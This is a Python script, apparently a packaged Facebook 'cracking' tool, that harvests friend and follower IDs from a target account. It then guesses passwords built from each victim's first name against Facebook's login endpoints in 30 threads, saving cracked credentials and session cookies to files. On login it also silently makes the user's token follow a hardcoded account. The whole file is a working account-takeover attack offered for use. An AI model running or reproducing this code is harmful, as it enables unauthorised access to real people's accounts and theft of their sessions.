# -*- coding: utf-8
# author by FUEGO X RAJUL
import os
try:
	import requests
except ImportError:
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")

import os, sys, re, time, requests, json, random, calendar
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]


def  jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.05)

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():
	os.system("clear")
	print("""\033[1;97m  L E G E N D -- F U E G O .X. R A J U L. \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;93m➤\033[1;97m Author   : FUEGO-X-RAJUL
\033[1;93m➤\033[1;97m Github   : https://github.com/MAFIA-FUEGO
\033[1;93m➤\033[1;97m Whatsapp : +27768432399
\033[1;97m--------------------------------------------------""")
def login():
	os.system("clear")
	try:
		#-> connection test
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit("Internet Connection Error")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		token = raw_input("\033[1;93m➤\033[1;97m Enter Token : ")
		if token == "":
			print("Wrong Input")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			#-> bot follow
			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit("[?] Login Error")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit("[?] Login Error")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit("\033[1;96m[\033[1;93m+\033[1;96m] Token Error")
	except requests.exceptions.ConnectionError:
		exit(" ! no internet connection")
	logo()
	
	print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97m Clone from public friends")
	print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m Crack from public followers")
	print("\033[1;97m[3]\033[1;91m-⋄-\033[1;97m Multi cracking from public Id\033[1;93m [ \033[1;95mPro \033[1;97m]")
	print("\033[1;97m[4]\033[1;91m-⋄-\033[1;97m Check crack results")
	print("\033[1;97m[5]\033[1;91m-⋄-\033[1;97m User-agent settings \033[1;97m [ \033[1;95mPRO \033[1;97m]")
	print("\033[1;97m[6]\033[1;91m-⋄-\033[1;97m Exit\033[1;97m [ \033[1;91m remove-token\033[1;97m]")
	
	Bilal = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
	if Bilal =="":
		menu()
	elif Bilal == "1" or Bilal == "01":
		publik()
		method()
	elif Bilal == "2" or Bilal == "02":
		follower()
		method()
	elif Bilal == "3" or Bilal == "03":
		massal()
		method()
	elif Bilal == "4" or Bilal == "04":
		print(" ")
		print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97m Check results OK")
		print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m Check results CP")
		print(" ")
		cek = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy file name  and past into input")
			for file in dirs:
				print("[•]  "+file)
			try:
				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] file name : ")
				if file == "":
					menu()
				Totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" Crack Resulte : %s Total : %s\033[0;92m"%(del_txt, len(Totalok)))
			os.system("cat OK/%s"%(file))
			print(" \033[0;94m # ----------------------------------------------")
			exit(" ")
		elif cek == "2":
			dirs = os.listdir("CP")
			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy File Name And Past into Input")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] File Name : ")
				if file == "":
					menu()
				Totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("# ----------------------------------------------")
			print(" Crack results : %s total : %s\033[0;93m"%(del_txt, len(Totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;96m # ----------------------------------------------")
			exit(" ")
		else:
			menu()
	elif Bilal == "5" or Bilal == "05":
		setting_ua()
	elif Bilal == "0" or Bilal == "00":
		os.system("rm -f login.txt")
		exit("\033[1;97m token Removed")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
	idt = raw_input("\033[1;93m➤\033[1;97m Target Id: ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("\033[1;93m➤\033[1;97m Account friend list is not public")
	print("\\033[1;93m➤\033[1;97m  Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
	idt = raw_input("\033[1;93m➤\033[1;97m Target ID : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("URL Error")
	print("[?] Total id  : \033[0;92m%s\033[0;96m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
	try:
		tanya_Total = int(input("\033[1;93m➤\033[1;97m Enter Multiple ID Option  : "))
	except:tanya_Total=1
	for t in range(tanya_Total):
		t +=1
		idt = raw_input("\033[1;93m➤\033[1;97m Target ID %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;93m➤\033[1;97m  Ids friend list Is not public")
	print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))

def method():
	print("\033[1;93m➤\033[1;97m Choose crack methord [recommended B-API]")
	print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mB-API\033[1;97m [ \033[1;95mFaster \033[1;97m]")
	print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m] M-basic\033[1;93m [ \033[1;95mFast \033[1;97m]")
	print("\033[1;97m[3]\033[1;91m-⋄-\033[1;97m Free facebook\033[1;93m [ \033[1;95m normal\033[1;97m]")
	method = raw_input("\033[1;93m➤\033[1;97m Option : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\033[1;93m➤\033[1;97m  Do you choose manual passwors ? y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] : ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(bapi, id)
		exit("Program End")
	elif method == "2":
		ask = raw_input("\033[1;93m➤\033[1;97m Do you choose manual passwords  y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mbasic, id)
		exit("Program End")
	elif method == "3":
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] Do you choose manual passwords y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mobile, id)
		exit("Program End")
	else:
		menu()

def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r\033[0;91m[FUEGO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass

def bapi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;93m➤\033[1;97m Cracking\033[1;91m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"123" ]
	elif len(name)<=2:
		pwx = [ name+"3", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"2", name+"12", name+"123" ]
	else:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mbasic(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mCracking\033[0;92m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mobile(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mCracking\033[0;93m]\033[0;95m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
	asu = raw_input("[+] Enter Passwords : ").split(",")
	if len(asu) =="":
		exit("[?] Wrong Input")
	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")

	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;92m[\033[0;96mCracking\033[0;92m]\033[0;96m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				kwargs = {}
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
				for i in b("input"):
					try:
						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
						else:continue
					except:pass
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n\n # [>Program Close<]")

def setting_ua():
	print("[1] Change User-Agent")
	print("[2] Default User-Agent")
	ua = raw_input("\n [?] Choose : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" [+] Enter User-Agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [!] Press Enter To Save User-Agent")
		menu()
	elif ua == "2":
		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n[•] User-Agent Save Successfully")
		menu()

def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()